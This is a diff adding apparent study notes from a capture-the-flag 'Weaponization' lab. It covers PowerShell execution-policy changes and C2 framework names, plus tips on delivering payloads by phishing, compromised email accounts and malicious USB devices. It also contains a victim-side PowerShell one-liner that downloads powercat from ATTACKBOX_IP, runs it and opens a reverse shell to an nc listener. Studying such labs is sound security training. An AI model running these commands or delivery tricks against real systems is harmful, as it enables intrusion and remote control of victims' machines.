@@ -125,6 +125,56 @@ set LPORT [PORT]
 exploit
 
 -document open in victim 
--reverse tcp connection 
+-reverse tcp connection
+
+--------------------------------------------------------------------------------------------------
+
+PowerShell (PSH)
+-object-oriented programming language
+-useful in inital access, system enumerations and more
+
+Write-Output "Welcome to the Weaponization Room!" -save as: thm.ps1
+powershell -File thm.ps1
+
+-by default microsoft disables powershell scripts '.ps1' for security purposes
+Get-ExecutionPolicy
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+A
+
+-Reverse Shell using powershell = powercat
+git clone https://github.com/besimorhino/powercat.git
+cd powercat
+python3 -m http.server 8080 - server of powercat 
+
+nc -lvp 1337 - listener
+
+-vicitim machine
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+Command And Control (C2)
+-Cobalt Strike
+-PowerShell Empire
+-Metasploit
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+Delivery Techniques
+-Email Delivery as phishing email with link or attachment
+-reputable email services
+-use a compromised email account
+
+Web Delivery
+-Clean TLS (Transport layer security certificate)
+-url shortner is helpful
+
+USB Delivery
+-events that distribute USB such as conferences
+-Rubber Ducky, USBHarpoon, Charging USB Cable O.MG cable
+
+
+
+
  
  
